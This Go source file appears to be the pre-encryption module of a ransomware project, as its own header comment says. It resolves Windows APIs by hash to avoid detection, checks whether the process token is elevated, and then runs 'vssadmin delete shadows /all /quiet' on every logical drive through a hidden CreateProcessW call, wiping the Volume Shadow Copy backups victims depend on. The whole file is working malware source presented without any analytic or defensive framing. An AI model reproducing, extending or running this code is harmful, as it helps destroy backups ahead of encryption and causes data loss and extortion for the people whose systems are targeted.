// this package performs the shadow copy deletion and check if admin before the encrypter executes

package main

import (
	"fmt"
	"regexp"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

func CheckAdmin() bool {
	advapiBase := wc.LoadLibraryLdr("advapi32.dll")
	k32Base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))

	getCurrentProcess := wc.GetFunctionAddress(k32Base, wc.GetHash("GetCurrentProcess"))
	openProcToken := wc.GetFunctionAddress(advapiBase, wc.GetHash("OpenProcessToken"))
	getTokInfo := wc.GetFunctionAddress(advapiBase, wc.GetHash("GetTokenInformation"))

	ourProc, _, _ := wc.CallG0(getCurrentProcess)

	var hToken uintptr
	_, _, _ = wc.CallG0(openProcToken, ourProc, 0x0008, uintptr(unsafe.Pointer(&hToken)))

	var elevation TOKEN_ELEVATION
	var returnLength uint32

	ret, _, _ := wc.CallG0(
		getTokInfo,
		hToken,
		20,
		uintptr(unsafe.Pointer(&elevation)),
		uint32(unsafe.Sizeof(elevation)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret == 0 {
		return false
	}

	return elevation.TokenIsElevated != 0
}

func VssCopies() {
	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	getDrivesW := wc.GetFunctionAddress(kernel32base, wc.GetHash("GetLogicalDriveStringsW"))
	cmd := ""
	buff := make([]byte, 254)
	wc.CallG0(getDrivesW, uintptr(len(buff)), uintptr(unsafe.Pointer(&buff[0])))
	buffStr := string(buff)
	reg, _ := regexp.Compile("[^a-zA-Z0-9]+")
	cleanedString := reg.ReplaceAllString(buffStr, "")
	for _, d := range cleanedString {
		drive := string(d) + ":\\"
		fmt.Printf("[+] deleting shadow copies for %s\n", drive)
		cmd += fmt.Sprintf("cmd.exe /c "+"vssadmin delete shadows /all /for=%s /quiet", drive)
		output := execCmd(cmd)
		fmt.Printf("vss output: %s\n", output)
		fmt.Printf("[+] done!\n")
		cmd = ""
	}
}

func execCmd(cmd string) string {
	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	createProcessW := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreateProcessW"))
	closeHandle := wc.GetFunctionAddress(kernel32base, wc.GetHash("CloseHandle"))
	createPipe := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreatePipe"))
	readFile := wc.GetFunctionAddress(kernel32base, wc.GetHash("ReadFile"))
	waitForSingleObject := wc.GetFunctionAddress(kernel32base, wc.GetHash("WaitForSingleObject"))
	var hRead, hWrite uintptr

	sa := SECURITY_ATTRIBUTES{
		nLength:              uint32(unsafe.Sizeof(SECURITY_ATTRIBUTES{})),
		lpSecurityDescriptor: 0,
		bInheritHandle:       1, // TRUE
	}

	ret, _, _ := wc.CallG0(createPipe, uintptr(unsafe.Pointer(&hRead)), uintptr(unsafe.Pointer(&hWrite)), uintptr(unsafe.Pointer(&sa)), 0)
	if ret == 0 {
		return ""
	}

	var si STARTUPINFO
	si.cb = uint32(unsafe.Sizeof(si))
	const STARTF_USESTDHANDLES = 0x00000100
	si.dwFlags = STARTF_USESTDHANDLES
	si.hStdOutput = hWrite
	si.hStdError = hWrite

	var pi PROCESS_INFORMATION

	cmdPtr, _ := wc.UTF16ptr(cmd)

	const CREATE_NO_WINDOW = 0x08000000

	ret, _, _ = wc.CallG0(
		createProcessW,
		0,
		uintptr(unsafe.Pointer(cmdPtr)),
		0,
		0,
		1, // bInheritHandles = TRUE
		CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return ""
	}

	wc.CallG0(closeHandle, hWrite)

	const INFINITE = 0xFFFFFFFF
	wc.CallG0(waitForSingleObject, pi.hProcess, INFINITE)

	var output []byte
	buffer := make([]byte, 256)
	var bytesRead uint32

	for {
		ret, _, _ := wc.CallG0(
			readFile,
			hRead,
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
			uintptr(unsafe.Pointer(&bytesRead)),
			0,
		)

		if ret == 0 || bytesRead == 0 {
			break
		}
		output = append(output, buffer[:bytesRead]...)
	}

	if pi.hProcess != 0 {
		wc.CallG0(closeHandle, pi.hProcess)
	}
	if pi.hThread != 0 {
		wc.CallG0(closeHandle, pi.hThread)
	}
	if hRead != 0 {
		wc.CallG0(closeHandle, hRead)
	}

	return string(output)
}
